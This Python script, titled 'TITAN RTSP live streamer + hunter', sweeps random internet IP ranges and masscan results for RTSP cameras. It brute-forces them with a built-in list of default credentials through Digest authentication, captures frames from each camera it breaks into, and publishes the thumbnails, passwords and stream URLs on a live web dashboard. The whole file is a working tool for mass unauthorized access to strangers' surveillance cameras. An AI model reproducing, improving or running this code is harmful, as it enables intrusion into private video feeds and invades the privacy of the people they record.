#!/usr/bin/env python3
"""
TITAN RTSP LIVE STREAMER + HUNTER
- Immediately serves found cameras on port 7701
- Continues scanning for more using masscan pre-scanned IPs + random CIDR sweep
- Dashboard auto-updates every 8 seconds
"""

import asyncio
import base64
import hashlib
import ipaddress
import json
import os
import random
import re
import subprocess
import sys
import threading
import time
from collections import OrderedDict
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from pathlib import Path

BASE = Path(__file__).resolve().parent
FRAMES = BASE / "stream_frames"
RESULTS = BASE / "results"
MASSCAN_FILE = BASE.parent / "skills" / "masscan_results.txt"
FRAMES.mkdir(exist_ok=True)
RESULTS.mkdir(exist_ok=True)

sys.path.insert(0, str(BASE))
from cctv_config import GLOBAL_CIDRS

# ── Config ──
TARGET = 100
PORT = 7701
DASH_PATH = BASE / "live_stream.html"

PATHS = [
    "/Streaming/Channels/101", "/cam/realmonitor?channel=1&subtype=0",
    "/", "/live", "/stream1", "/h264/ch1/main/av_stream", "/0", "/1",
    "/onvif1", "/live.sdp", "/Streaming/Channels/102",
]
CREDS = [
    ("admin", ""), ("admin", "12345"), ("admin", "admin"), ("admin", "123456"),
    ("admin", "888888"), ("admin", "666666"), ("admin", "1234"), ("admin", "1111"),
    ("root", ""), ("root", "pass"), ("root", "root"),
    ("admin", "password"), ("admin", "admin123"),
]

# ── Globals ──
CAMS = OrderedDict()  # ip -> cam dict (deduplicated)
LOCK = threading.Lock()
STATS = {"ips_scanned": 0, "rtsp_hosts": 0, "valid": 0, "frames": 0,
         "round": 0, "status": "loading", "source": ""}


# ══════════════════════════════════════════════════════════
# LOAD EXISTING
# ══════════════════════════════════════════════════════════

def load_existing():
    path = RESULTS / "live_deduped.json"
    if not path.exists():
        return
    with open(path) as f:
        data = json.load(f)
    for cam in data:
        ip = cam["ip"]
        if ip not in CAMS:
            CAMS[ip] = cam
    STATS["valid"] = len(CAMS)
    print(f"[LOAD] {len(CAMS)} existing cameras loaded")


# ══════════════════════════════════════════════════════════
# FRAME GRABBER
# ══════════════════════════════════════════════════════════

def grab_frame(cam):
    safe = cam["ip"].replace(".", "_")
    fpath = str(FRAMES / f"cam_{safe}.jpg")
    try:
        r = subprocess.run(
            ["ffmpeg", "-y", "-rtsp_transport", "tcp", "-stimeout", "5000000",
             "-i", cam["rtsp_url"], "-vframes", "1", "-vf", "scale=640:-1",
             "-q:v", "3", "-f", "image2", fpath],
            capture_output=True, timeout=10, text=True)
        if r.returncode == 0 and os.path.isfile(fpath) and os.path.getsize(fpath) > 2000:
            cam["frame_file"] = fpath
            with open(fpath, "rb") as f:
                cam["frame_b64"] = base64.b64encode(f.read()).decode()
            res = re.search(r"(\d{2,5})x(\d{2,5})", r.stderr)
            cam["resolution"] = f"{res.group(1)}x{res.group(2)}" if res else "?"
            STATS["frames"] += 1
            return True
    except Exception:
        pass
    cam["frame_b64"] = ""
    cam["resolution"] = cam.get("resolution", "?")
    return False


def grab_all_frames():
    """Grab frames for all cameras that don't have one yet."""
    needs = [c for c in CAMS.values() if not c.get("frame_b64")]
    if not needs:
        return
    print(f"[FRAMES] Grabbing frames for {len(needs)} cameras...")
    with ThreadPoolExecutor(max_workers=8) as pool:
        list(pool.map(grab_frame, needs))
    print(f"[FRAMES] Done. {sum(1 for c in CAMS.values() if c.get('frame_b64'))} total frames")


# ══════════════════════════════════════════════════════════
# ASYNC RTSP SCANNER (from blitz_v3 — fixed dedup)
# ══════════════════════════════════════════════════════════

def _digest(user, pwd, realm, nonce, uri):
    ha1 = hashlib.md5(f"{user}:{realm}:{pwd}".encode()).hexdigest()
    ha2 = hashlib.md5(f"DESCRIBE:{uri}".encode()).hexdigest()
    return hashlib.md5(f"{ha1}:{nonce}:{ha2}".encode()).hexdigest()


async def options_check(ip, sem):
    async with sem:
        try:
            r, w = await asyncio.wait_for(asyncio.open_connection(ip, 554), 0.8)
            w.write(f"OPTIONS rtsp://{ip}:554/ RTSP/1.0\r\nCSeq: 1\r\n\r\n".encode())
            await w.drain()
            data = await asyncio.wait_for(r.read(512), 1.0)
            w.close()
            if b"RTSP" in data:
                return ip
        except Exception:
            pass
    return None


async def describe_one(ip, path, user, pwd, sem):
    """Single DESCRIBE attempt with optional Digest auth."""
    if ip in CAMS:
        return None
    async with sem:
        if ip in CAMS:
            return None
        url = f"rtsp://{ip}:554{path}"
        req = f"DESCRIBE {url} RTSP/1.0\r\nCSeq: 2\r\nAccept: application/sdp\r\nUser-Agent: LibVLC/3.0.18\r\n\r\n"
        try:
            r, w = await asyncio.wait_for(asyncio.open_connection(ip, 554), 1.2)
            w.write(req.encode())
            await w.drain()
            data = await asyncio.wait_for(r.read(2048), 1.5)
            resp = data.decode(errors="ignore")

            if "RTSP/1.0 200" in resp:
                w.close()
                return {"ip": ip, "port": 554, "rtsp_url": url,
                        "user": "", "password": "", "path": path,
                        "auth": "none", "resolution": "?"}

            if "401" in resp and user:
                rm = re.search(r'realm="([^"]*)"', resp)
                nm = re.search(r'nonce="([^"]*)"', resp)
                if rm and nm:
                    realm, nonce = rm.group(1), nm.group(1)
                    dig = _digest(user, pwd, realm, nonce, url)
                    auth_hdr = (f'Authorization: Digest username="{user}", realm="{realm}", '
                                f'nonce="{nonce}", uri="{url}", response="{dig}"')
                    w.write(f"DESCRIBE {url} RTSP/1.0\r\nCSeq: 3\r\nAccept: application/sdp\r\n"
                            f"User-Agent: LibVLC/3.0.18\r\n{auth_hdr}\r\n\r\n".encode())
                    await w.drain()
                    data2 = await asyncio.wait_for(r.read(4096), 1.5)
                    if b"RTSP/1.0 200" in data2:
                        w.close()
                        return {"ip": ip, "port": 554,
                                "rtsp_url": f"rtsp://{user}:{pwd}@{ip}:554{path}",
                                "user": user, "password": pwd, "path": path,
                                "auth": "digest", "resolution": "?"}
            w.close()
        except Exception:
            pass
    return None


async def probe_hosts(rtsp_ips):
    sem = asyncio.Semaphore(2000)
    tasks = []
    for ip in rtsp_ips:
        if ip in CAMS:
            continue
        # Fast pass: top 3 paths, no auth
        for path in PATHS[:3]:
            tasks.append(describe_one(ip, path, "", "", sem))
        # Auth pass: top 2 paths × top 5 creds
        for path in PATHS[:2]:
            for user, pwd in CREDS[:5]:
                tasks.append(describe_one(ip, path, user, pwd, sem))

    found = {}
    results = await asyncio.gather(*tasks, return_exceptions=True)
    for r in results:
        if r and isinstance(r, dict):
            ip = r["ip"]
            if ip not in found and ip not in CAMS:
                found[ip] = r
    return list(found.values())


# ══════════════════════════════════════════════════════════
# IP SOURCES
# ══════════════════════════════════════════════════════════

def load_masscan_ips():
    if not MASSCAN_FILE.exists():
        return []
    ips = set()
    with open(MASSCAN_FILE) as f:
        for line in f:
            if '554/open' in line:
                parts = line.split()
                for i, p in enumerate(parts):
                    if p == 'Host:':
                        ip = parts[i + 1]
                        if ip not in CAMS:
                            ips.add(ip)
                        break
    return list(ips)


def gen_random_ips(n):
    all_cidrs = [c for country in GLOBAL_CIDRS.values() for c in country]
    nets = [ipaddress.ip_network(c, strict=False) for c in all_cidrs if '/' in c]
    ws = [net.num_addresses for net in nets]
    out = set()
    while len(out) < n:
        net = random.choices(nets, weights=ws, k=1)[0]
        if net.num_addresses > 2:
            ip = str(net.network_address + random.randint(1, net.num_addresses - 2))
            if not ip.endswith((".0", ".255")) and ip not in CAMS:
                out.add(ip)
    return list(out)


# ══════════════════════════════════════════════════════════
# HUNT LOOP
# ══════════════════════════════════════════════════════════

def hunt():
    STATS["status"] = "hunting"

    # Phase 1: Masscan IPs (already known port 554 open — skip OPTIONS)
    masscan_ips = load_masscan_ips()
    random.shuffle(masscan_ips)
    print(f"[HUNT] {len(masscan_ips):,} masscan IPs to probe")

    batch_size = 3000
    for start in range(0, len(masscan_ips), batch_size):
        if len(CAMS) >= TARGET:
            break
        STATS["round"] += 1
        STATS["source"] = "masscan"
        batch = masscan_ips[start:start + batch_size]
        batch = [ip for ip in batch if ip not in CAMS]
        STATS["ips_scanned"] += len(batch)
        STATS["rtsp_hosts"] += len(batch)  # already known RTSP

        print(f"\n[R{STATS['round']}] Masscan batch {len(batch)} IPs | found={len(CAMS)}/{TARGET}")

        loop = asyncio.new_event_loop()
        new_cams = loop.run_until_complete(probe_hosts(batch))
        loop.close()

        for cam in new_cams:
            if len(CAMS) >= TARGET:
                break
            ip = cam["ip"]
            if ip in CAMS:
                continue
            with LOCK:
                CAMS[ip] = cam
            STATS["valid"] = len(CAMS)
            auth = f"{cam['user']}:{cam['password']}" if cam.get('user') else "OPEN"
            print(f"  ✅ #{len(CAMS):>3}  {ip:>16}  [{auth}]  {cam['path']}")

        if new_cams:
            grab_all_frames()
            save_results()
            regen_dashboard()

    # Phase 2: Random CIDR sweep (if masscan didn't get us to 100)
    while len(CAMS) < TARGET:
        STATS["round"] += 1
        STATS["source"] = "cidr_sweep"
        ips = gen_random_ips(150000)
        STATS["ips_scanned"] += len(ips)

        print(f"\n[R{STATS['round']}] CIDR sweep {len(ips):,} IPs | found={len(CAMS)}/{TARGET}")

        # OPTIONS phase
        loop = asyncio.new_event_loop()
        sem = asyncio.Semaphore(4000)
        tasks = [options_check(ip, sem) for ip in ips]
        results = loop.run_until_complete(asyncio.gather(*tasks))
        rtsp_hosts = [ip for ip in results if ip and ip not in CAMS]
        loop.close()
        STATS["rtsp_hosts"] += len(rtsp_hosts)
        print(f"  OPTIONS: {len(rtsp_hosts)} RTSP hosts")

        if not rtsp_hosts:
            continue

        # DESCRIBE + auth
        loop2 = asyncio.new_event_loop()
        new_cams = loop2.run_until_complete(probe_hosts(rtsp_hosts))
        loop2.close()

        for cam in new_cams:
            if len(CAMS) >= TARGET:
                break
            ip = cam["ip"]
            if ip in CAMS:
                continue
            with LOCK:
                CAMS[ip] = cam
            STATS["valid"] = len(CAMS)
            auth = f"{cam['user']}:{cam['password']}" if cam.get('user') else "OPEN"
            print(f"  ✅ #{len(CAMS):>3}  {ip:>16}  [{auth}]  {cam['path']}")

        if new_cams:
            grab_all_frames()
            save_results()
            regen_dashboard()

    STATS["status"] = "complete"
    save_results()
    regen_dashboard()
    print(f"\n{'='*70}")
    print(f"  COMPLETE — {len(CAMS)} unique live cameras found")
    print(f"{'='*70}")


# ══════════════════════════════════════════════════════════
# DASHBOARD
# ══════════════════════════════════════════════════════════

def regen_dashboard():
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    cams = list(CAMS.values())
    pct = min(100, int(len(cams) / TARGET * 100))

    cards = ""
    for i, c in enumerate(cams):
        b64 = c.get("frame_b64", "")
        if b64:
            img = f'<img src="data:image/jpeg;base64,{b64}" style="width:100%;border-radius:6px;margin-top:6px;">'
        else:
            img = '<div style="height:140px;background:#181830;border-radius:6px;display:flex;align-items:center;justify-content:center;color:#444;font-size:11px;">Frame pending...</div>'
        auth = f'{c.get("user","")}:{c.get("password","")}' if c.get("user") else "OPEN"
        cards += f'''
<div style="background:#12122a;border:1px solid #2a2a4a;border-radius:8px;padding:10px;margin:5px;width:280px;flex-shrink:0;">
  <div style="display:flex;justify-content:space-between;align-items:center;">
    <span style="color:#0f0;font-weight:bold;font-size:13px;">#{i+1}</span>
    <span style="color:#0ff;font-size:11px;">{c["ip"]}</span>
  </div>
  {img}
  <div style="font-size:11px;color:#aaa;margin-top:4px;">
    <b>{c.get("resolution","?")}</b> | Port {c["port"]} | {c.get("auth","?")}<br>
    Path: <code style="color:#0ff;font-size:10px;">{c.get("path","?")}</code><br>
    Auth: <span style="color:#ff0;">{auth}</span>
  </div>
  <div style="font-size:9px;color:#555;word-break:break-all;margin-top:3px;cursor:pointer;"
       onclick="navigator.clipboard.writeText('{c.get("rtsp_url","")}')" title="Click to copy RTSP URL">
    {c.get("rtsp_url","")}
  </div>
</div>'''

    html = f'''<!DOCTYPE html><html><head><meta charset="utf-8">
<title>TITAN LIVE STREAMS — {len(cams)}/{TARGET}</title>
<meta http-equiv="refresh" content="8">
<style>
body{{background:#0a0a18;color:#eee;font-family:'Courier New',monospace;margin:0;padding:15px;}}
code{{background:#000;padding:1px 3px;border-radius:2px;}}
.bar{{width:100%;background:#111;border-radius:8px;height:22px;margin:10px 0;overflow:hidden;}}
.fill{{background:linear-gradient(90deg,#0f0,#0ff);height:100%;border-radius:8px;text-align:center;font-size:11px;font-weight:bold;color:#000;line-height:22px;transition:width 0.5s;}}
.s{{display:inline-block;background:#111;padding:6px 12px;border-radius:5px;margin:3px;border:1px solid #222;font-size:12px;}}
.s b{{color:#0f0;}}
</style></head><body>
<h1 style="color:#f00;margin:0 0 8px;">TITAN LIVE RTSP STREAMS</h1>
<div style="display:flex;flex-wrap:wrap;">
  <span class="s">Status: <b>{STATS["status"]}</b></span>
  <span class="s">IPs Scanned: <b>{STATS["ips_scanned"]:,}</b></span>
  <span class="s">RTSP Hosts: <b>{STATS["rtsp_hosts"]:,}</b></span>
  <span class="s" style="border-color:#0f0;">Cameras: <b style="font-size:18px;">{len(cams)}/{TARGET}</b></span>
  <span class="s">Frames: <b>{STATS["frames"]}</b></span>
  <span class="s">Round: <b>{STATS["round"]}</b></span>
  <span class="s">Source: <b>{STATS.get("source","—")}</b></span>
  <span class="s">{ts}</span>
</div>
<div class="bar"><div class="fill" style="width:{pct}%">{pct}% — {len(cams)} cameras</div></div>
<div style="display:flex;flex-wrap:wrap;">{cards}</div>
<div style="margin-top:20px;padding:10px;background:#111;border-radius:6px;font-size:11px;color:#666;">
  Click any RTSP URL to copy. Open with: <code>vlc rtsp://...</code> or <code>ffplay rtsp://...</code>
</div>
</body></html>'''
    DASH_PATH.write_text(html)


def save_results():
    cams = list(CAMS.values())
    out = {
        "timestamp": datetime.now().isoformat(),
        "stats": STATS,
        "count": len(cams),
        "streams": [{k: c.get(k) for k in
                      ["ip", "port", "rtsp_url", "user", "password", "path",
                       "resolution", "auth"]} for c in cams],
    }
    with open(RESULTS / "live_streams.json", "w") as f:
        json.dump(out, f, indent=2, default=str)


# ══════════════════════════════════════════════════════════
# HTTP SERVER
# ══════════════════════════════════════════════════════════

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/api/stats":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(json.dumps({"stats": STATS, "cameras": len(CAMS)}).encode())
        elif self.path == "/api/streams":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            cams = [{k: c.get(k) for k in ["ip", "port", "rtsp_url", "user", "password",
                     "path", "resolution", "auth"]} for c in CAMS.values()]
            self.wfile.write(json.dumps(cams).encode())
        elif DASH_PATH.exists():
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(DASH_PATH.read_bytes())
        else:
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(b"<html><body style='background:#000;color:#0f0;font-family:monospace;padding:40px;'>"
                             b"<h1>TITAN LIVE STREAMS</h1><p>Loading cameras...</p></body></html>")

    def log_message(self, fmt, *args):
        pass


# ══════════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════════

if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument("--target", type=int, default=100)
    p.add_argument("--port", type=int, default=7701)
    args = p.parse_args()
    TARGET = args.target
    PORT = args.port

    # Load existing cameras
    load_existing()

    # Grab frames for existing cameras first
    print("[INIT] Grabbing frames for existing cameras...")
    grab_all_frames()

    # Generate initial dashboard
    regen_dashboard()
    save_results()

    # Start HTTP server
    srv = threading.Thread(
        target=lambda: HTTPServer(('0.0.0.0', PORT), Handler).serve_forever(),
        daemon=True)
    srv.start()

    print(f"\n{'='*70}")
    print(f"  TITAN LIVE STREAMS — http://localhost:{PORT}")
    print(f"  {len(CAMS)} cameras loaded | Target: {TARGET}")
    print(f"  Dashboard live and auto-updating")
    print(f"{'='*70}\n")

    if len(CAMS) >= TARGET:
        STATS["status"] = "complete"
        regen_dashboard()
        print(f"Already at target! {len(CAMS)} cameras. Serving dashboard.")
        # Keep serving
        try:
            while True:
                time.sleep(60)
        except KeyboardInterrupt:
            pass
    else:
        try:
            hunt()
        except KeyboardInterrupt:
            print(f"\nStopped — {len(CAMS)} cameras")
        finally:
            save_results()
            regen_dashboard()
            print(f"Serving at http://localhost:{PORT} — Ctrl+C to stop")
            try:
                while True:
                    time.sleep(60)
            except KeyboardInterrupt:
                pass
